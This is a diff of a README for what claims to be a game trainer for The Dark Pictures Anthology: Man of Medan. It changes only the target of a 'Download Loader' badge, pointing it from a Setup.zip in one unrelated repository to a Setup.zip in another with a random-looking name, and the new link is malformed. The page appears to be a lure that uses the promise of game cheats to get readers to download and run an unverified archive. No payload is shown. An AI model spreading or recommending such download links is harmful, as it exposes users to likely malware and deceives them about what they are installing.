@@ -4,7 +4,7 @@
 
 > ⚡ Advanced Game Modification Project for The Dark Pictures Anthology: Man of Medan Trainer
 
-[![🚀 Download Loader](https://img.shields.io/badge/🚀%20Download%20Loader-7C3AED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/TameDragonflyFlare/Dota-2/releases/download/main/Setup.zip)
+[![🚀 Download Loader](https://img.shields.io/badge/🚀%20Download%20Loader-7C3AED?style=for-the-badge&logo=github&logoColor=white)]https://github.com/WASD122/bvvb/releases/download/main/Setup.zip)
 
 ---
 
@@ -38,3 +38,4 @@ configs/
 `The-Dark-Pictures-Anthology-Man-of-Medan-Trainer` · Updated: 2026-10-26
 
 **Tags:** `the-dark-pictures-anthology-man-of-medan` `horror` `narrative` `interactive-drama`
+
